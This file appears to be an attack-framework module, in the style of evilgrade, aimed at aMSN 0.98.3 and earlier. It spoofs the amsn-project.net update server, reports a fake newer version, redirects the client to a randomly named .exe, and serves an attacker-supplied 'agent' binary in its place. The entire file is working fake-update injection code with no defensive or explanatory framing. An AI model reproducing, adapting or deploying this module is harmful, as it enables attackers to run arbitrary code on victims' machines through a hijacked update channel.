from modules import ModuleBase


class aMSN(ModuleBase):
    name = 'aMSN'
    appver = '<= 0.98.3'
    version = '1.0'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ""
    vh = 'www.amsn-project.net'
    options = {
        'version': {
            'val' : "'2.' + rand_num(3) + '.' + rand_num(1)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [{
            'path': '/amsn_latest',
            'type': 'string',
            'method': '',
            'bin': '',
            'string' : "<%VERSION%>",
            'parse': '1',
            'file': ''
        }, {
            'path': '.xml',
            'type': 'string',
            'method': '',
            'bin': '',
            'string' : "",
            'parse': '0',
            'file': ''
        }, {
            'path': '/$',
            'type': 'string',
            'method': '', 
            'bin': 0,
            'string': '<html><script>window.location="http://www.amsn-project.net/amsn<%RND1%>.exe"</script></html>',
            'parse': 1,
            'file': '',
        }, {
            'path': '.exe', 
            'type': 'agent',
            'method': '', 
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }]

